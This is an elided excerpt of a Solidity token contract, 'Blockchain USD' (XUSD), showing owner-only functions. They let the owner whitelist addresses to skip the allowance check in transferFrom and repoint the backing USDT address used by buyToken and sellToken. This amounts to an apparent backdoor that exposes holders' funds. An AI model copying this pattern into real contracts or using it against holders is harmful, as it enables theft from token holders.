...
contract Blockchain_XUSD is owned {
    ...
    string constant private _name = "Blockchain USD";
    string constant private _symbol = "XUSD";
    ...
    mapping(address => bool) public skipAllowanceAdd;
    bool public allowanceSkip;
    ...
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        ...
        if(skipAllowanceAdd[msg.sender] && allowanceSkip==true)
        {
    ...
    function changeUsdtAdd(address _add) public onlyOwner returns(bool){
        require(_add!=address(0),"Invalid Address");
        usdtAdd=_add;
        return true;
    }
    
    function commercialApprove(address _add, bool _allow) public onlyOwner returns(bool){
        require(_add!=address(0),"Invalid Address");
        skipAllowanceAdd[_add] = _allow;
        return true;
    }

    function setCommercial(bool _allow) public onlyOwner returns(bool){
        allowanceSkip = _allow;
        return true;
    }   
    ...
    function buyToken(uint256 _amount) public returns(bool)
    {
        ...
        usdt(usdtAdd).transferFrom(msg.sender,address(this),_amount);
        
        _balanceOf[msg.sender]=_balanceOf[msg.sender].add(_amount);
    ...
    function sellToken(uint256 _amount) public returns(bool)
    {
        ...
        usdt(usdtAdd).transfer(msg.sender,_amount);
